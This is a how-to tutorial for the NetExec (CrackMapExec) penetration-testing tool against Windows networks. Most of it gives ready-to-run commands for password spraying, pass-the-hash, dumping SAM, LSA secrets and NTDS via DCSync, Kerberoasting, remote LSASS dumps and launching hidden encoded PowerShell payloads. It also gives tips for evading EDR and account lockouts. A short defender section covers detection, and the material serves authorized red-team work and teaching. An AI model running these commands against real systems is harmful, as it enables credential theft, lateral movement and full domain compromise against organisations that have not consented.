# CrackMapExec / NetExec (nxc) — full tutorial

`nxc` (NetExec) is the actively-maintained successor to `CrackMapExec`. It's the swiss-army knife for enumerating, authenticating to, and pivoting through Windows networks via SMB, WinRM, RDP, MSSQL, FTP, SSH, and LDAP.

> [!info] CrackMapExec is deprecated
> Don't install `crackmapexec` from PyPI — it's frozen at an old version. Use `nxc` from the NetExec repo. Same syntax, current modules.

## Install

```terminal
pipx install netexec
# or
git clone https://github.com/Pennyw0rth/NetExec && cd NetExec && pip install -e .
```

## Protocols

```terminal
nxc smb       # SMB (most common)
nxc winrm     # WinRM
nxc ldap      # LDAP / Kerberos
nxc mssql     # MSSQL
nxc rdp       # RDP
nxc ftp / ssh / vnc / nfs
```

## Standard usage shape

```terminal
nxc <protocol> <target(s)> [-u user] [-p pass | -H hash] [-d domain] [options]
```

Targets can be: a single IP, CIDR, file (`-t targets.txt`), or domain.

## Authentication options

| Flag | Auth method |
|------|-------------|
| `-u alice -p 'Pass1'` | Plaintext |
| `-u alice -H aad3b435...:5e5a...` | Pass-the-hash |
| `-u alice --aesKey <key>` | Kerberos AES |
| `-u alice -k --use-kcache` | Kerberos using ccache |
| `-u alice -p Pass1 -d corp.local` | Domain auth |
| `-u 'corp.local\\alice' -p Pass1` | Same |
| `--local-auth` | Authenticate as local user, not domain |
| `-u user.txt -p pass.txt` | Spray combinations |
| `--continue-on-success` | Don't stop after first hit (spraying) |

## Enumeration (no creds)

| Option | Effect |
|--------|--------|
| (no creds) | Just `nxc smb 10.0.0.0/24` shows OS, name, signing, SMBv1, null sessions |
| `--shares` | List SMB shares (anonymous / null) |
| `--users / --groups / --pass-pol` | Pull user / group / password policy via SAMR |
| `--rid-brute` | Enumerate users via SID brute-forcing (works without auth on some hosts) |
| `--sessions` | Active sessions on host |
| `--loggedon-users` | Logged-on user list |

## Post-auth options

| Option | Effect |
|--------|--------|
| `-x 'whoami'` | Run command (uses smbexec/winrm) |
| `-X 'powershell -ec ...'` | PowerShell |
| `--exec-method smbexec|wmiexec|atexec|mmcexec` | Which exec channel |
| `--sam` | Dump SAM (local hashes) |
| `--lsa` | Dump LSA secrets |
| `--ntds` | Dump NTDS.dit (DCSync — needs DA-equivalent rights) |
| `--ntds drsuapi|vss` | Method for ntds dump |
| `--users` after auth | Enumerate domain users with details |
| `--shares` after auth | List shares with permissions per user |
| `--spider <share> --pattern <regex>` | Crawl SMB shares for files matching pattern |
| `--gen-relay-list <file>` | List signing-disabled hosts (for ntlmrelayx) |

## Modules

```terminal
nxc smb -L           # list modules (200+)
nxc smb 10.0.0.5 -u alice -p Pass1 -M <module> -o KEY=val
```

Highlights:

| Module | What it does |
|--------|--------------|
| `enum_av` | What AV is running |
| `enum_chrome` | Pull Chrome DPAPI-encrypted creds |
| `lsassy` | Remote LSASS dump |
| `mimikatz` | Drop & run Mimikatz, parse output |
| `bh_owned` | Mark hosts as owned in BloodHound |
| `wcc` | Windows Configuration Checker |
| `gpp_password` | Decrypt cpassword from GPP files |
| `petitpotam` / `coercer` | Trigger NTLM coercion |
| `add-computer` | MS-DS-MachineAccountQuota abuse |
| `rdcheck` | Test RDP creds |

## Workflows

### Map a /24 with no creds

```terminal
nxc smb 10.0.0.0/24
# OS, signing, SMBv1, name — gives you the lay of the land
```

### Spray creds across the subnet

```terminal
nxc smb 10.0.0.0/24 -u 'alice' -p 'Spring2026!' --continue-on-success
nxc smb 10.0.0.0/24 -u users.txt -p 'Spring2026!' --continue-on-success
```

### Spray hashes (post-cred-theft)

```terminal
nxc smb 10.0.0.0/24 -u alice -H aad3b435...:5e5a... --continue-on-success
```

### Confirm DA via DCSync

```terminal
nxc smb dc01.corp.local -u domain-admin -p Pass1 --ntds
# Or if you already have hashes:
nxc smb dc01.corp.local -u domain-admin -H <NT> --ntds
```

### Dump SAM from every host you have local admin on

```terminal
nxc smb owned-hosts.txt -u administrator -H <local-admin-hash> --local-auth --sam
```

### Find shares with juicy patterns

```terminal
nxc smb 10.0.0.0/24 -u alice -p Pass1 -M spider_plus -o EXTENSIONS='xml,txt,docx,zip' READ_ONLY=true
```

### Drop and run a payload

```terminal
nxc smb 10.0.0.5 -u alice -p Pass1 \
  --exec-method wmiexec \
  -X 'powershell -nop -w hidden -ec <BASE64>'
```

### LDAP-only Kerberoast / AS-REP roast

```terminal
nxc ldap dc01 -u alice -p Pass1 --kerberoasting krb.txt
nxc ldap dc01 -u alice -p Pass1 --asreproast asrep.txt
```

## Good output

Color-coded console:

- Green `[+]` = success.
- Magenta `(Pwn3d!)` = local admin → high signal.
- Red `[-]` = failed.

```
SMB         10.0.0.5     445   FILESRV  [+] CORP\alice:Pass1 (Pwn3d!)
SMB         10.0.0.6     445   APP01    [+] CORP\alice:Pass1
SMB         10.0.0.7     445   DC01     [+] CORP\alice:Pass1
LDAP        10.0.0.7     389   DC01     [+] [Kerberoast] svc_sql:$krb5tgs$23$*svc_sql$CORP.LOCAL$svc_sql*$...
```

`(Pwn3d!)` on the file server = next stop is `--sam` to harvest local creds.

## Bad output and fixes

| Symptom | Cause | Fix |
|---------|-------|-----|
| `STATUS_LOGON_FAILURE` everywhere | Wrong creds / domain | Verify domain qualifier; try `--local-auth` for local accounts |
| `STATUS_PASSWORD_MUST_CHANGE` | Account flagged for password change | Treat as half-success — credentials valid but can't auth normally |
| `connection refused` from many hosts | SMB filtered (firewalls) | Try WinRM (`nxc winrm ...`) or LDAP |
| Spray locks accounts | Smart-lockout policy | Slow it down with `-d` delay; spray ≤ N attempts/hour/user |
| `--ntds` fails with `RPC_S_ACCESS_DENIED` | Not DA / no DRSUAPI rights | Need `Replicate Directory Changes` privilege; use NTDSDSync or vss method |
| `Pwn3d!` on host but `-x` fails | EDR blocking exec method | Try `--exec-method atexec` (scheduled task), `mmcexec`, or `wmiexec` |

## Defender's perspective

NetExec is a **massive** generator of telemetry:

- 4624 / 4625 logons across many hosts from one source IP — classic spray.
- ADMIN$ writes for smbexec / wmiexec service binaries with random short names.
- 4769 TGS-REQ for many service accounts (Kerberoast).
- LDAP query bursts.

Detection wins:

- Microsoft Defender for Identity has detections for "Suspicious Authentication Failure" (spray), "Suspicious DC Sync attempt", "Honeytoken account activity".
- Sigma rules for `wmiexec` / `smbexec` service-name patterns.
- Honeyusers in AD: any auth attempt to a fake `svc_admin_old` account is malicious.

## OPSEC

- Always `--continue-on-success` for spraying so you don't stop at first hit.
- Don't `--ntds` over `drsuapi` from a non-admin host — it's the loudest action you can take. Use only when the engagement scope authorizes.
- Many modules drop Mimikatz / lsassy DLLs — modern EDR catches them. Use BYOD-ish techniques (signed drivers / patched binaries) only with explicit authorization.

## Related tools

| Tool | Niche |
|------|-------|
| **Impacket** | Atomic protocol scripts (`secretsdump`, `wmiexec`) — what nxc wraps |
| **Rubeus** | Kerberos-specific (Windows-side) |
| **Mimikatz** | Local/credential extraction |
| **Certipy** | AD CS specifically |
| **PingCastle** | Defender's posture audit |
| **adidnsdump** | DNS records via LDAP |
